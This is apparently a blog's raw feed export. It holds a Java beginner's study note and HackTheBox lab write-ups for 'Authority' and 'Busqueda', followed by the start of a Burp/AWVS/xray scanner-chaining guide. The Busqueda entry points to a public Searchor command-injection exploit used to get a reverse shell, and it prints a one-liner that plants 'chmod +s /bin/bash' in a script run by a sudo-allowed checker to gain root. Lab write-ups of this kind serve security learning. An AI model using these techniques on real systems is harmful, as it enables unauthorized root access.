s2.printThis();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111410757.png" alt="image-20231011141056688"></p><p>this访问当前对象的成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s3.score = <span class="number">300</span>;</span><br><span class="line">s3.printPass(<span class="number">200</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printPass</span><span class="params">(<span class="type">double</span> score)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.score &gt; score)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;恭喜考入哈佛&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;没有考入&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111543580.png" alt="image-20231011154336504"></p><p>1.构造器要和类名相同</p><p>2.构造器无返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参数构造器被触发&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参数构造器被触发&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111523641.png" alt="image-20231011152336571"></p><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111539557.png" alt="image-20231011153924489"></p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>私有成员变量</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111612967.png" alt="image-20231011161223899"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111614109.png" alt="image-20231011161426038"></p><h2 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111635349.png" alt="image-20231011163523258"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310111649383.png" alt="image-20231011164959308"></p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310151606660.png" alt="image-20231015160607614"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310151650288.png" alt="image-20231015165051239"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.设计一个电影类</span></span><br><span class="line">        <span class="comment">//2.设计一个电影操作类</span></span><br><span class="line">        <span class="comment">//3.准备电影数据</span></span><br><span class="line">        Movie[] movies = <span class="keyword">new</span> <span class="title class_">Movie</span>[<span class="number">4</span>];</span><br><span class="line">        movies[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Movie</span>(<span class="number">1</span>,<span class="string">&quot;水门桥&quot;</span>,<span class="number">38.9</span>,<span class="number">9.1</span>,<span class="string">&quot;徐克&quot;</span>,<span class="string">&quot;吴京&quot;</span>,<span class="string">&quot;12万人想看&quot;</span>);</span><br><span class="line">        movies[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Movie</span>(<span class="number">2</span>,<span class="string">&quot;月球陨落&quot;</span>,<span class="number">37.2</span>,<span class="number">9.8</span>,<span class="string">&quot;汤香兰&quot;</span>,<span class="string">&quot;李白&quot;</span>,<span class="string">&quot;11.2万人想看&quot;</span>);</span><br><span class="line">        movies[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Movie</span>(<span class="number">3</span>,<span class="string">&quot;出拳吧&quot;</span>,<span class="number">38.5</span>,<span class="number">9.4</span>,<span class="string">&quot;罗兰&quot;</span>,<span class="string">&quot;小黑&quot;</span>,<span class="string">&quot;15.4万人想看&quot;</span>);</span><br><span class="line">        movies[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Movie</span>(<span class="number">4</span>,<span class="string">&quot;aaa&quot;</span>,<span class="number">38.5</span>,<span class="number">9.6</span>,<span class="string">&quot;bb&quot;</span>,<span class="string">&quot;小白&quot;</span>,<span class="string">&quot;16.4万人想看&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建电影操作类的对象,接受电影数据,带入业务处理</span></span><br><span class="line">        <span class="type">MovieOperator</span> <span class="variable">operator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MovieOperator</span>(movies);</span><br><span class="line"><span class="comment">//        operator.printAllMovie();</span></span><br><span class="line"><span class="comment">//        operator.searchMovieById(2);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.菜单选项</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;===电影信息系统===&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;1.查询全部电影信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;2.根据id查询电影全部信息&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;输入操作编号:&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">command</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">switch</span> (command) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span> -&gt; operator.printAllMovie();</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span> -&gt; &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;输入id:&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">                    operator.searchMovieById(id);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">default</span> -&gt; System.out.println(<span class="string">&quot;输入操作编号有误,请重新输入&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MovieOperator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Movie[] movies;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MovieOperator</span><span class="params">(Movie[] movies)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.movies = movies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.展示全部电影信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printAllMovie</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------系统全部电影信息如下---------&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; movies.length; i++) &#123;</span><br><span class="line">            <span class="type">Movie</span> <span class="variable">m</span> <span class="operator">=</span> movies[i];</span><br><span class="line">            System.out.println(<span class="string">&quot;编号:&quot;</span> + m.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;名称:&quot;</span> + m.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;价格:&quot;</span> + m.getPrice());</span><br><span class="line">            System.out.println(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.通过编号查询详细信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">searchMovieById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; movies.length; i++) &#123;</span><br><span class="line">            <span class="type">Movie</span> <span class="variable">m</span> <span class="operator">=</span> movies[i];</span><br><span class="line">            <span class="keyword">if</span> (m.getId() == id) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;该电影详情如下&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;编号:&quot;</span> + m.getId());</span><br><span class="line">                System.out.println(<span class="string">&quot;名称:&quot;</span> + m.getName());</span><br><span class="line">                System.out.println(<span class="string">&quot;价格:&quot;</span> + m.getPrice());</span><br><span class="line">                System.out.println(<span class="string">&quot;得分:&quot;</span> + m.getScore());</span><br><span class="line">                System.out.println(<span class="string">&quot;导演:&quot;</span> + m.getDirector());</span><br><span class="line">                System.out.println(<span class="string">&quot;演员:&quot;</span> + m.getActor());</span><br><span class="line">                System.out.println(<span class="string">&quot;其他信息:&quot;</span> + m.getInfo());</span><br><span class="line">                <span class="keyword">return</span>;<span class="comment">// 结束</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;没有该电影信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chenci.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Movie</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> Price;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> score;</span><br><span class="line">    <span class="keyword">private</span> String director;</span><br><span class="line">    <span class="keyword">private</span> String actor;</span><br><span class="line">    <span class="keyword">private</span> String info;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">double</span> price)</span> &#123;</span><br><span class="line">        Price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Movie</span><span class="params">(<span class="type">int</span> id, String name,<span class="type">double</span> price, <span class="type">double</span> score, String director, String actor, String info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.score = score;</span><br><span class="line">        <span class="built_in">this</span>.director = director;</span><br><span class="line">        <span class="built_in">this</span>.actor = actor;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">        Price = price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getScore</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setScore</span><span class="params">(<span class="type">double</span> score)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDirector</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> director;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDirector</span><span class="params">(String director)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.director = director;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getActor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> actor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setActor</span><span class="params">(String actor)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.actor = actor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInfo</span><span class="params">(String info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="成员变量和局部变量的区别"><a href="#成员变量和局部变量的区别" class="headerlink" title="成员变量和局部变量的区别"></a>成员变量和局部变量的区别</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310151724476.png" alt="image-20231015172411400"></p><h1 id="常用api"><a href="#常用api" class="headerlink" title="常用api"></a>常用api</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171431648.png" alt="image-20231017143130565"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;java学完忘完了,从头捡起来…顺便记录一下&lt;/p&gt;
&lt;p&gt;仅记录自己学习中觉得值得记录的地方,并不完全,也不适合所有人&lt;/p&gt;
&lt;h2 i</summary>
      
    
    
    
    <category term="代码审计" scheme="https://syst1m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://syst1m.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="https://syst1m.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-Authority</title>
    <link href="https://syst1m.top/2023/07/20/htb%E6%89%93%E9%9D%B6-Authority/"/>
    <id>https://syst1m.top/2023/07/20/htb%E6%89%93%E9%9D%B6-Authority/</id>
    <published>2023-07-20T06:23:23.000Z</published>
    <updated>2023-07-20T06:35:31.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>拿到ip,先nmap扫一下看看开放端口,开放端口挺多的,挨个看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307201430012.png" alt="image-20230720143007952"></p><p>访问8443端口,需要加https</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307201433881.png" alt="image-20230720143309838"></p><p>在下拉框中找到版本信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307201435508.png" alt="image-20230720143501478"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;拿到ip,先nmap扫一下看看开放端口,开放端口挺多的,挨个看看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-Busqueda</title>
    <link href="https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/"/>
    <id>https://syst1m.top/2023/07/14/htb%E6%89%93%E9%9D%B6-Busqueda/</id>
    <published>2023-07-14T05:58:40.000Z</published>
    <updated>2023-07-14T09:35:44.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>拿到靶机ip先nmap扫描下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141419677.png" alt="image-20230714141955637"></p><p>开放80 22 看下web,输入ip跳转到这个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141420082.png" alt="image-20230714142038037"></p><p>添加下域名解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141421710.png" alt="image-20230714142152680"></p><p>正常访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141423784.png" alt="image-20230714142321734"></p><p>大致意思是,输入搜索内容,随便输入,返回url</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141425877.png" alt="image-20230714142547846"></p><p>跳转到一个新的网站,没什么用,扫下目录,没发现东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141430225.png" alt="image-20230714143016191"></p><p>探测下cms,flask的一个框架</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141434247.png" alt="image-20230714143430215"></p><p>网站首页下方</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141435278.png" alt="image-20230714143536245"></p><p>寻找exp,找到一个利用<a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a> 一个rce</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>一发入魂,返回shell,这里ip是自己攻击机的ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141445541.png" alt="image-20230714144549508"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141446056.png" alt="image-20230714144612028"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l,因为是反弹的shell,需要加-S,提示我们要密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141650653.png" alt="image-20230714165010614"></p><p>找到一个隐藏目录,在config文件中撞出密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141653662.png" alt="image-20230714165352629"></p><p>找到一个sui权限的python文件,但是没有查看权限,通过名字可以得知是系统检查</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141655480.png" alt="image-20230714165556425"></p><p>反弹的shell不太方便,直接ssh上去,运行这个脚本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141704830.png" alt="image-20230714170436776"></p><p>提示需要参数,带入参数执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141709406.png" alt="image-20230714170908350"></p><p>参数名和当前目录下一个文件名相同,有可能是调用了这个full-check.sh文件,我们创建一个自己的full-checkup.sh试试,切换到tmp目录,但是在执行的时候一直报错,文件会被删除</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307141720958.png" alt="image-20230714172000899"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> full-checkup.sh&amp;&amp;<span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; full-checkup.sh&amp;&amp;<span class="built_in">chmod</span> +x full-checkup.sh&amp;&amp;sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;拿到靶机ip先nmap扫描下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>联动套娃挖洞bp+awvs+xray</title>
    <link href="https://syst1m.top/2023/07/06/%E8%81%94%E5%8A%A8%E5%A5%97%E5%A8%83%E6%8C%96%E6%B4%9Ebp-awvs-xray/"/>
    <id>https://syst1m.top/2023/07/06/%E8%81%94%E5%8A%A8%E5%A5%97%E5%A8%83%E6%8C%96%E6%B4%9Ebp-awvs-xray/</id>
    <published>2023-07-06T08:28:12.000Z</published>
    <updated>2023-07-07T02:40:52.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burp-配置"><a href="#burp-配置" class="headerlink" title="burp 配置"></a>burp 配置</h1><h2 id="第一层代理配置"><a href="#第一层代理配置" class="headerlink" title="第一层代理配置"></a>第一层代理配置</h2><p>awvs的流量会经过这里</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061702308.png" alt="image-20230706170206267"></p><h2 id="第二层代理配置"><a href="#第二层代理配置" class="headerlink" title="第二层代理配置"></a>第二层代理配置</h2><p>流量会经过burp后转发给xray</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061707728.png" alt="image-20230706170720687"></p><h1 id="xray-配置"><a href="#xray-配置" class="headerlink" title="xray 配置"></a>xray 配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_arm64 webscan --listen 127.0.0.1:7777 --html-output ./out/vul.html       </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061709083.png" alt="image-20230706170937042"></p><h1 id="AWVS配置"><a href="#AWVS配置" class="headerlink" title="AWVS配置"></a>AWVS配置</h1><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>我这里使用docker起的一个Awvs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">docker run -it -d -p 13443:3443 --cap-add LINUX_IMMUTABLE secfa/docker-awvs</span><br><span class="line"></span><br><span 